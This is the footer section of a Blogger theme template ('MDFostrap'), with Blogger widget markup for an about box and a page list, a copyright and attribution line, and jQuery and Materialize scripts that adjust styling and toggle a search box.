        <div class='banner-ads banner-footer container center' id='banner-footer'>
            <!-- YOUR ADS CODE --> 
        </div>   
        <footer class='page-footer cyan' id='footer'>
          <div class='container '>
            <div class='row'>
              <div class='col l6 s12'> 
                <b:section class='title-footer' id='title-footer' maxwidgets='1' showaddelement='yes'>
                   <b:widget id='HTML4' locked='false' title='About MDFostrap' type='HTML' version='1' visible='true'>
                     <b:includable id='main'>
                          <!-- only display title if it's non-empty -->
                          <b:if cond='data:title != &quot;&quot;'>
                            <h5 class='white-text'><data:title/></h5>
                          </b:if>
                          <p class='grey-text text-lighten-4'>
                            <data:content/>
                          </p> 
                        </b:includable>
                   </b:widget>
                 </b:section> 
<div>
             
            </div>
              </div>
              <div class='col l4 offset-l2 s12'>
            <b:section class='LinkMu' id='LinkMu' maxwidgets='1' showaddelement='yes'>
              <b:widget id='PageList1' locked='false' title='' type='PageList' version='1' visible='true'>
                <b:includable id='main'>
                      <b:if cond='data:title != &quot;&quot;'><h2><data:title/></h2></b:if>
                      <div class='widget-content'>
                        <b:if cond='data:mobile'>
                          <select expr:id='data:widget.instanceId + &quot;_select&quot;'>
                            
                              <b:loop values='data:links' var='link'>
                                <b:if cond='data:link.isCurrentPage'>
                                  <option expr:value='data:link.href' selected='selected'><data:link.title/></option>
                                <b:else/>
                                  <option expr:value='data:link.href'><data:link.title/></option>
                                </b:if>
                              </b:loop>
                            
                          </select>
                          <span class='pagelist-arrow'>&amp;#9660;</span>

                        <b:else/>
                          <ul class='row'>
                            <b:loop values='data:links' var='link'>
                              <b:if cond='data:link.isCurrentPage'>
                                <li class='selected col l4 s4 grey-text text-lighten-3'><a expr:href='data:link.href' expr:title='data:link.title'><data:link.title/></a></li>
                              <b:else/>
                                <li class='selected col l4 s4 grey-text text-lighten-3'><a expr:href='data:link.href' expr:title='data:link.title'><data:link.title/></a></li>
                              </b:if>
                            </b:loop>
                          </ul>
                        </b:if> 
                      </div>
                    </b:includable>
              </b:widget>
            </b:section> 
              </div>
            </div>
          </div>
          <div class='footer-copyright cyan darken-2'>
            <div class='container'>
            <div>
      <span class='hide-on-small-only'>
            &#169; 2016 Copyright <a expr:href='data:blog.homepageUrl'> <data:blog.title/></a> Powered by <a href='http://blogger.com'>Blogger</a> 
              </span>
            <a class='grey-text text-lighten-4 right please-dont' href='http://www.fostrap.com/' id='please-dont' target='_blank'>Wisnu ST</a><span class='right' id='copyright-name'> Template Design by &#160;</span>
            </div>
          </div>
          </div>
        </footer>
            
  
  <script src='https://cdnjs.cloudflare.com/ajax/libs/materialize/0.96.1/js/materialize.min.js' type='text/javascript'/>

<!-- coloring --> 
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<script>  
// coloring
$(&quot;.post-single-outer h1, .post-single-outer h2, .post-single-outer h3, .post-single-outer h4, .post-single-outer h5, .post-single-outer h6&quot;).addClass(&#39;cyan-text&#39;)
$(&quot;.post-labels a&quot;).removeClass(&#39;grey-text&#39;).removeClass(&#39;text-darken-2&#39;) 
$(&quot;.post-author.vcard, .post-comment-link, .post-single-outer .post-labels a, .post-timestamp&quot;).removeClass(&#39;grey-text&#39;).removeClass(&#39;text-darken-2&#39;)
$(&quot;.post-single-outer .post-labels a&quot;).addClass(&#39;white-text&#39;)
</script>
</b:if>

<!-- end coloring -->
<script>  
 
  $(&#39;.quickedit&#39;).remove()
  $(&#39;a:not([title])&#39;).attr(&#39;title&#39;, &#39; &#39;); 

$(document).ready(function() {   

    $(&#39;.dropdown-button&#39;).dropdown({
         inDuration: 300,
         outDuration: 225,
         constrain_width: true, 
         hover: false, 
         gutter: 0, 
         belowOrigin: false 
         }
    ); 
    $(&#39;.post-home-title&#39;).attr(&quot;itemprop&quot;,&quot;headline&quot;);
	
    $(&#39;img:not([alt])&#39;).attr(&#39;alt&#39;, &#39;Image&#39;); 
    $(&#39;img:not([title])&#39;).attr(&#39;title&#39;, &#39;Image&#39;);
 
    $(&#39;#nav_searchbox_counter&#39;).click(function(event) {
      $(&#39;#nav_searchbox&#39;).slideToggle(400);
      $(&#39;#nav_searchbox_counter&#39;).toggleClass(&#39;search_counter&#39;);
    });
    $(&#39;.mdi-navigation-close.close&#39;).click(function(event) {
      $(&#39;#nav_searchbox&#39;).slideUp(400);
      $(&#39;#nav_searchbox_counter&#39;).removeClass(&#39;search_counter&#39;);
    });
    $(&#39;.container-box&#39;).click(function(event) {
      $(&#39;#nav_searchbox&#39;).slideUp(400);
      $(&#39;#nav_searchbox_counter&#39;).removeClass(&#39;search_counter&#39;);
    });
    $(&#39;.first-top&#39;).click(function(event) {
      $(&#39;#nav_searchbox&#39;).slideUp(400);
      $(&#39;#nav_searchbox_counter&#39;).removeClass(&#39;search_counter&#39;);
    });
    $(&#39;#nav_m_searchbox_counter&#39;).click(function(event) {
      $(&#39;#nav_searchbox&#39;).slideToggle(400) 
    });     
	
}); 
</script>  
  </body>
</html>
